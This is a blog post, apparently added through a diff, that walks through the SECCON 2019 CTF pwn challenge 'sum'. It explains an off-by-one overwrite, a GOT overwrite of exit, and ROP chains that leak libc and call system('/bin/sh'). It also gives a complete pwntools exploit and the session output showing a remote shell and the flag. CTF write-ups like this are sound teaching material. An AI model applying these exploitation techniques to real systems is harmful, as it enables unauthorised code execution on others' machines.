@@ -1,0 +1,269 @@
+---
+layout: post
+title:  "SECCON 2019 Online CTF: sum (pwn)"
+date:   2019-10-20 14:00:00 +0800
+categories: pwn
+tags: SECCON-2019
+---
+
+I didn't get much time this weekend for this CTF due to having to study for two tests. I only spent a couple hours and managed to solve `one` and `sum`, the two easy pwn challenges.
+
+`sum` was a pwn challenge with a simple concept. It acted as a calculator, allowing you to sum up to 5 numbers together and giving you the result.
+
+Although I'd classify the challenge as easy, I'd say it was a VERY unique challenge since I've never seen a challenge like this before, which may be the reason it had less solves compared to `one`.
+
+### **Challenge**
+
+* **Category:** pwn
+* **Points:** 289
+* **Solves:** 58
+
+>uouo
+>
+>`sum.chal.seccon.jp 10001`
+>
+> Estimated Difficulty: easy
+>
+>* [sum](https://score-quals.seccon.jp/files/sum_ccafa40ee6a5a675341787636292bf3c84d17264)
+>* [libc.so](https://score-quals.seccon.jp/files/libc.so_18292bd12d37bfaf58e8dded9db7f1f5da1192cb)
+
+### **Solution**
+
+The binary wasn't stripped, making it very easy to reverse. It had the following characteristics:
+```sh
+vagrant@ubuntu-bionic:/ctf/seccon-2019/sum$ checksec sum
+[*] '/ctf/seccon-2019/sum/sum'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+The functions look like this:
+```c
+int main(void)
+{
+  long long int_array[5];
+  long long *ref_total;
+  long long total;
+
+  int_array = 0;
+  total = 0;
+  ref_total = &total;
+  puts("[sum system]\nInput numbers except for 0.\n0 is interpreted as the end of sequence.\n");
+  puts("[Example]\n2 3 4 0");
+  read_ints(int_array, 5);
+  if (sum(int_array, ref_total) > 5 )
+    exit(-1);
+  printf("%llu\n", total);
+  return 0;
+}
+
+void read_ints(long long *int_array, int num_of_ints)
+{
+  for (int i = 0; i <= num_of_ints; ++i) // Off by one error
+  {
+    if (scanf("%lld", int_array[i]) != 1 )
+      exit(-1);
+    if (!int_array[i]) // Read until a 0
+      break;
+  }
+}
+
+int sum(long long *int_array, long long *ref_total)
+{
+  *ref_total = 0;
+  for (int i = 0; *(int_array + i*8); ++i )
+  {
+    *ref_total += *(int_array + i*8);
+  }
+  return i;
+}
+```
+
+So essentially, `read_ints` is ***supposed*** to read in 5 integers and add them together, storing them in the `int_array` variable in `main` which is passed by reference into `read_ints`. 
+
+However, as is evident, there is an off by one error in the for loop in `read_ints` which actually lets us overwrite `ref_total` in main by inputting 6 numbers, since `ref_total` comes immediately after the declaration for `int_array`. This means the `ref_total` will be set to the 6th number we input.
+
+Due to this off by one, we can control `ref_total`, and since we control `ref_total`, we have an arbitrary write primitive when the `sum` function is called, since it will add all the numbers in `int_array` up and store it into `*ref_total`.
+
+The next thing to be aware of is that if `sum` returns more than 5 (i.e if it returns the fact that it added up more than 5 numbers), then `exit` gets called. If we ***do*** perform an overwrite, we'll have inputted 6 numbers, meaning `sum` will return 6, thus `exit` will definitely get called.
+
+First instinct would be to overwrite `exit` with `main`. However, that won't help at all, since that doesn't provide us any way to get a leak. We can't control the first arguments of any of the functions, so looping back to `main` like that would be useless.
+
+After some time of thinking and tinkering around with GDB, I found that just before `exit` is called in `main`, the 6 numbers we input are all on the stack. This means that when the `call exit` instruction happens, first the return address will be pushed to the stack, then execution will jump to `exit`.
+
+Knowing this, if we overwrite `exit` with a `pop anything; ret` gadget, this return address will be popped off the stack, and then our program will return into the first integer we entered for the `sum` function. We can do a 5 gadget ROP chain in this way to get a leak (since the 6th number needs to be a valid pointer, otherwise `sum` will crash when writing into `*ref_total`).
+
+The other interesting part about the challenge is that whatever value we overwrite `*ref_total` with will need to be carefully calculated since the final write value will depend on the functionality of the `sum` function. I will leave that as an exercise to the reader to figure out exactly how my exploit overwrites with the specific values. If you really can't figure out how it works, feel free to email me or DM me on twitter.
+
+First, overwrite `exit_got` with a `pop rdi; ret` gadget, and make sure that the first number we enter is `main`'s address, so that the `ret` in `pop rdi; ret` will jump back to main:
+```python
+# overwrite exit_got with pop rdi; ret
+p.recv()
+p.sendline('{} {} {} -1 +1 {}'.format(main, -main, pop_rdi - exit_got, exit_got))
+```
+
+Now that we have a way to control code execution any time we input 6 numbers, we can start with our ROP chains. 
+
+The first thing to note is that no matter what we do, we ***will*** overwrite ***something*** in memory. Because of this, I chose the address 0x601080 in the `.bss` segment, which was already empty. Any time we do our ROP chain, I simply overwrote that address, which didn't affect the rest of the program.
+
+For our first ROP chain, I simply called `puts(puts_got)` to get a leak. We have to put a `ret` gadget before calling `puts` to align the stack (because the provided libc is 2.27). Note that `garbage` refers to the address 0x601080 in the `.bss` segment I just mentioned.
+
+In order to parse the leak though, the remote binary behaved differently to locally, which is why you see the `p.recvuntil` that only runs if we run the exploit remotely:
+```python
+# ROP to get libc leak
+p.recv()
+p.sendline('{} {} {} {} {} {}'.format(ret, pop_rdi, puts_got, puts, main, garbage))
+
+# Remote binary behaves differently for whatever reason
+if args.REMOTE:
+    p.recvuntil('0\n')
+
+leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
+libc.address = leak - libc.symbols['puts']
+system = libc.symbols['system']
+bin_sh = next(libc.search('/bin/sh'))
+
+log.info('Leak: ' + hex(leak))
+log.info('Libc base: ' + hex(libc.address))
+log.info('system: ' + hex(system))
+log.info('/bin/sh: ' + hex(bin_sh))
+```
+
+After the libc leak, it's just another ROP chain to call `system('/bin/sh')`:
+```python
+# ROP to system('/bin/sh')
+p.recv()
+p.sendline('{} {} {} 1 1 {}'.format(pop_rdi, bin_sh, system, garbage))
+
+p.interactive()
+```
+
+Flag: `SECCON{ret_call_call_ret??_ret_ret_ret........shell!}`
+
+### **Final Exploit**
+
+```python
+#!/usr/bin/env python2
+
+from pwn import *
+
+BINARY = './sum'
+HOST, PORT = 'sum.chal.seccon.jp', 10001
+
+elf = ELF(BINARY)
+libc = ELF('./libc-2.27.so')
+
+def start():
+    if not args.REMOTE:
+        print "LOCAL PROCESS"
+        return process(BINARY)
+    else:
+        print "REMOTE PROCESS"
+        return remote(HOST, PORT)
+
+def debug(breakpoints):
+    script = "handle SIGALRM ignore\n"
+    for bp in breakpoints:
+        script += "b *0x%x\n"%(bp)
+    gdb.attach(p,gdbscript=script)
+
+def overwrite(src, dest):
+    p.recv()
+    p.sendline('{} -1 -1 1 1 {}'.format(dest - src, src))
+
+context.terminal = ['tmux', 'new-window']
+
+p = start()
+if args.GDB:
+    debug([0x40099d]) # 
+
+printf_got = elf.got['printf']
+exit_got = elf.got['exit']
+puts_got = elf.got['puts']
+main = elf.symbols['main']
+puts = elf.plt['puts']
+garbage = 0x601080
+pop_rdi = 0x400a43
+ret = 0x4005ee
+
+# overwrite exit_got with pop rdi; ret
+p.recv()
+p.sendline('{} {} {} -1 +1 {}'.format(main, -main, pop_rdi - exit_got, exit_got))
+
+# ROP to get libc leak
+p.recv()
+p.sendline('{} {} {} {} {} {}'.format(ret, pop_rdi, puts_got, puts, main, garbage))
+
+# Remote binary behaves differently for whatever reason
+if args.REMOTE:
+    p.recvuntil('0\n')
+
+leak = u64(p.recvline().strip('\n').ljust(8, '\x00'))
+libc.address = leak - libc.symbols['puts']
+system = libc.symbols['system']
+bin_sh = next(libc.search('/bin/sh'))
+
+log.info('Leak: ' + hex(leak))
+log.info('Libc base: ' + hex(libc.address))
+log.info('system: ' + hex(system))
+log.info('/bin/sh: ' + hex(bin_sh))
+
+# ROP to system('/bin/sh')
+p.recv()
+p.sendline('{} {} {} 1 1 {}'.format(pop_rdi, bin_sh, system, garbage))
+
+p.interactive()
+```
+
+```sh
+vagrant@ubuntu-bionic:/ctf/seccon-2019/sum$ ./exploit.py REMOTE
+[*] '/ctf/seccon-2019/sum/sum'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/ctf/seccon-2019/sum/libc-2.27.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+REMOTE PROCESS
+[+] Opening connection to sum.chal.seccon.jp on port 10001: Done
+[*] Leak: 0x7f0b9fdab9c0
+[*] Libc base: 0x7f0b9fd2b000
+[*] system: 0x7f0b9fd7a440
+[*] /bin/sh: 0x7f0b9fedee9a
+[*] Switching to interactive mode
+/bin/sh: 1: 0: not found
+$ ls
+bin
+boot
+dev
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sum
+sys
+tmp
+usr
+var
+$ cat flag.txt
+SECCON{ret_call_call_ret??_ret_ret_ret........shell!}
+$  
+```
